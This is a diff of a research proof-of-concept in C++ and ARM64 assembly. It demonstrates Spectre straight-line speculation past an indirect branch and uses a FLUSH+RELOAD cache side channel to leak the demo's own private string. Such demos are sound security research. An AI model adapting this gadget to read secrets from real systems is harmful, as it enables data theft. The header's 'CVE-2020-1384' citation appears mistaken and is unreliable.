@@ -7,96 +7,147 @@
  * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
  */
 
-// Spectre-SLS: Straight-Line Speculation past ret on ARM64.
+// Spectre SLS -- Straight-Line Speculation via indirect branch on ARM64.
 //
-// When the Return Address Stack (RAS) is empty, ret (BR X30) falls back
-// to BTB prediction. If the BTB also misses, the CPU predicts the
-// fallthrough address, speculatively executing dead code after ret.
+// Demonstrates that after an unconditional indirect branch (BR instruction),
+// the CPU may speculatively execute instructions placed immediately after the
+// branch in memory ("straight-line"), before the branch target is resolved.
 //
-// PHT/BTB considerations:
-// - The drain loop's ret instructions train the BTB for their own PC,
-//   but the SLS trigger ret is at a different PC, so the drain training
-//   does not carry over.
-// - A fixed SLS ret PC would be learned by the BTB after the first call,
-//   causing subsequent calls to predict the correct architectural target
-//   instead of fallthrough. To defeat this, we use variant-indexed ret
-//   instructions: 32 ret instructions at unique PCs, selected by the run
-//   counter. Each variant's ret is a BTB miss on first use, ensuring
-//   fallthrough prediction and SLS trigger on every call within the
-//   variant window.
+// This is related to CVE-2020-1384. The attack works as follows:
+//
+//   1. We place a "speculative gadget" (load secret + cache oracle access)
+//      immediately after a BR instruction in memory.
+//
+//   2. The BR target address is loaded from a cache-missed memory location,
+//      so the CPU cannot resolve the branch target immediately.
+//
+//   3. While waiting for the target address, the CPU fetches and speculatively
+//      executes the instructions that follow the BR in program order -- the
+//      straight-line path -- even though architecturally the BR will redirect
+//      execution to a completely different location.
+//
+//   4. The speculatively executed gadget loads a secret byte and uses it to
+//      index into a cache side-channel oracle (FLUSH+RELOAD).
+//
+//   5. When the BR target finally resolves, the speculative results are
+//      discarded -- but the cache state persists as a side effect.
+//
+//   6. We measure cache access latencies to determine which oracle entry was
+//      touched speculatively, recovering the secret byte.
+//
+// PLATFORM NOTES:
+// This demo targets ARM64 (AArch64) only. It requires an out-of-order CPU
+// that performs straight-line speculation after indirect branches. Results
+// may vary across microarchitectures; some CPUs may require additional BTB
+// (Branch Target Buffer) pressure to reliably trigger the speculation.
 
+#include "compiler_specifics.h"
+
+#if !SAFESIDE_ARM64
+#  error Unsupported architecture. ARM64 required.
+#endif
+
+#include <array>
 #include <cstring>
 #include <iostream>
 
 #include "cache_sidechannel.h"
-#include "compiler_specifics.h"
+#include "instr.h"
 #include "local_content.h"
+#include "utils.h"
 
-constexpr int kRasDrainCount = 32;
-constexpr int kVariantCount = 32;
-
-// x0 = data, x1 = offset, x2 = oracle, x7 = variant index (0..31)
+// SafeTarget: the architectural destination of the indirect branch.
+// This function is intentionally empty. When BR jumps here, the RET
+// instruction uses x30 (link register), which still holds the return
+// address to SlsGadget's caller. This means control returns correctly
+// without any stack corruption, as long as SlsGadget is a leaf function
+// (no stack frame of its own).
 SAFESIDE_NEVER_INLINE
-static void TriggerSls(const char *data, size_t offset,
-                       const void *oracle, size_t variant) {
-  register const char *r0 asm("x0") = data;
-  register size_t r1 asm("x1") = offset;
-  register const void *r2 asm("x2") = oracle;
-  register size_t r7 asm("x7") = variant;
-
-  asm volatile(
-      // Phase 1: RAS drain
-      // Each iteration: set X30 to local label, ret pops stale RAS
-      // entry, mispredicts, flushes pipeline, resumes at local label.
-      // After 32 iterations the RAS is empty.
-      "mov x4, #32\n"
-      "adr x5, 1f\n"
-      "0:\n"
-      "  mov x30, x5\n"
-      "  ret\n"
-      "1:\n"
-      "  subs x4, x4, #1\n"
-      "  b.ne 0b\n"
-
-      // Phase 2: variant-indexed SLS trigger
-      // Jump to variant[run % 32]. Each variant has ret at a unique PC
-      // that the BTB has never seen, so it predicts fallthrough.
-      "adr x8, 2f\n"
-      "add x8, x8, x7, lsl #5\n"  // variant * 32 bytes per variant
-      "br x8\n"
-
-      // 32 variants, each exactly 32 bytes (8 instructions).
-      // ret underflows RAS, BTB misses -> fallthrough into dead code.
-      "2:\n"
-      ".rept 32\n"
-      "  adr x30, 3f\n"
-      "  ret\n"
-      "  ldrb w3, [x0, x1]\n"
-      "  lsl x3, x3, #12\n"
-      "  add x3, x3, x2\n"
-      "  ldrb w3, [x3]\n"
-      "  ret\n"
-      "  nop\n"
-      ".endr\n"
-
-      "3:\n"
-      :
-      : "r"(r0), "r"(r1), "r"(r2), "r"(r7)
-      : "x3", "x4", "x5", "x8", "x30", "memory", "cc"
-  );
+static void SafeTarget() {
+  // Intentionally empty -- returns via x30 set by the original caller.
 }
 
+// Global function pointer: the branch target stored in memory.
+// We flush this from cache before each BR so that loading the target
+// address is slow (~100+ cycles), creating a window during which the
+// CPU speculatively executes the straight-line gadget.
+static void (*g_branch_target)(void) = SafeTarget;
+
+// SlsGadget: the core of the SLS attack.
+//
+// Layout in memory:
+//   LDR  x0, [g_branch_target]   ; load target (cache miss = slow)
+//   BR   x0                      ; indirect branch to SafeTarget
+//   LDRB w3, [secret_addr]       ; \
+//   ADD  x3, oracle, x3, LSL 12  ;  >-- speculative payload
+//   LDRB w3, [x3]                ; /
+//
+// Architecturally, BR redirects to SafeTarget which returns to the caller.
+// Speculatively, the CPU executes the three payload instructions straight-line
+// before the BR target is known, loading a secret byte into the cache oracle.
+//
+// This function must remain a leaf function (no calls, no stack frame) so that
+// SafeTarget's RET can return directly to our caller with a clean stack.
+SAFESIDE_NEVER_INLINE
+static void SlsGadget(const char *secret_addr, const void *oracle_base) {
+  asm volatile(
+      // Load the branch target from memory. Because g_branch_target was
+      // flushed from cache, this LDR stalls for ~100+ cycles.
+      "ldr x0, %2\n"
+
+      // Indirect branch. The CPU cannot resolve the target until the LDR
+      // above completes, so it speculatively fetches and executes the
+      // instructions that follow the BR in memory (straight-line).
+      "br  x0\n"
+
+      // === Straight-line speculation payload ===
+      // These instructions are speculatively executed before BR resolves.
+
+      // Load the secret byte from private_data into w3 (zero-extended to x3).
+      "ldrb w3, [%0]\n"
+
+      // Compute the oracle address: oracle_base + secret_byte * 4096.
+      // Each oracle entry (BigByte) is 4096 bytes to avoid cache prefetching.
+      "add  x3, %1, x3, lsl 12\n"
+
+      // Touch the oracle entry -- this loads it into cache, creating a
+      // microarchitectural side effect that survives speculation rollback.
+      "ldrb w3, [x3]\n"
+      :
+      : "r"(secret_addr), "r"(oracle_base), "m"(g_branch_target)
+      : "x0", "x3", "memory");
+  // Architecturally unreachable -- BR jumps to SafeTarget.
+}
+
+// Leaks private_data[offset] via straight-line speculation after BR.
+//
+// For each run:
+//   1. Flush the cache oracle (all 256 entries)
+//   2. Flush g_branch_target from cache to delay BR resolution
+//   3. Execute SlsGadget: BR to SafeTarget, but CPU speculates the payload
+//   4. Measure oracle latencies to identify which entry was touched
+//   5. Accumulate scores across runs until one byte dominates
 static char LeakByte(size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
-    size_t safe_offset = run % strlen(public_data);
-    TriggerSls(public_data, offset, oracle.data(), run % kVariantCount);
 
-    std::pair<bool, char> result =
-        sidechannel.RecomputeScores(public_data[safe_offset]);
+    // Flush the branch target pointer from cache. This makes the LDR in
+    // SlsGadget slow, giving the CPU time to speculatively execute the
+    // straight-line payload before the BR target address is known.
+    FlushDataCacheLine(&g_branch_target);
+    MemoryAndSpeculationBarrier();
+
+    // Execute the SLS gadget.
+    //   Architecturally: BR -> SafeTarget -> RET -> back to LeakByte.
+    //   Speculatively:   secret byte loaded, oracle entry touched.
+    SlsGadget(&private_data[offset], sidechannel.GetOracle().data());
+
+    // The secret was only accessed speculatively -- there is no architectural
+    // cache hit to use as a reference. AddHitAndRecomputeScores injects an
+    // artificial architectural hit and checks which oracle entry was accessed.
+    std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
     if (result.first) {
       return result.second;
     }
@@ -111,9 +162,11 @@ static char LeakByte(size_t offset) {
 int main() {
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  const size_t private_offset = private_data - public_data;
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    std::cout << LeakByte(private_offset + i);
+    // Leak each byte of private_data. The only architectural memory accesses
+    // are to valid bytes in public_data and local auxiliary structures --
+    // private_data is never accessed in the C++ execution model.
+    std::cout << LeakByte(i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
